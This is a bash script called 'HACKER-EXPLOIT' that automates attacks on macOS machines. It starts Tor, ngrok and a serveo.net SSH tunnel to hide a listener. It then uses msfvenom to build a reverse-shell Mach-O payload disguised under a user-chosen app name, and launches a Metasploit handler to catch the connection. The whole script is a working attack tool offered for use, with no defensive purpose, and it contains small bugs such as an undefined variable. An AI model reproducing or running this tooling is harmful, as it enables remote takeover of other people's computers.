#!/bin/bash
LPARTH=`pwd`

RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
# requirements tool download
clear




clear

#logo or name
echo " WELCOME TO MAC "
figlet -f standard HACKER
echo " EXPLOIT "

#tool logo
echo "==========================================="
echo "==========||||||||||||||||||||||==========="
echo "==========||||HACKER-EXPLOIT||||==========="
echo "==========||||||||||||||||||||||==========="
echo "==========================================="


		service tor start
		sleep 4.3;
		echo "${GREEN}[*] ${YELLOW}NGROK Por-Forwarding starting ....${RESTORE}"
		xterm -hold -T "Hacker-Exploit-V2" -e "proxychains $LPARTH/ngrok tcp 8080" &
		sleep 4.3;
		echo "${RESTORE}"

		echo "EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080  "
		echo "EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current LPORT ) "
		echo "${RESTORE}"

		echo " please input your current NGROK url "
		read -p ' HE :~' IP

		echo " please input your NGROK Port number "
		read -p ' HE :~ ' PORT


		echo " please input your choice App name"
		read -p ' HE :~ ' SYSFUC 
#
#Xterm serveo.net

xterm -hold -T "Hacker-Exploit" -e "ssh -R $PORT:$IP:$PORT serveo.net" &

#OUTPUT 

echo " ===============loading-100%================="

echo "file Crearing while 3 of 2 min "


sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f macho -o $LPARTH/WH-output/$SYSFUC.macho



#temp  file creating 
echo " Creating a msf temp " 
rm -rf $LPARTH/temp
mkdir temp

touch $LPARTH/temp/$SYSFUC.rc 

#exquate ip & port & handeler & payload 

echo " use exploit/multi/handler" >> $LPARTH/temp/$SYSFUC.rc 
echo " set payload osx/x86/shell_reverse_tcp " >> $LPARTH/temp/$SYSFUC.rc
echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc
echo " oping msfconsole  "


msfconsole -r $LPARTH/temp/$SYSFUC.rc

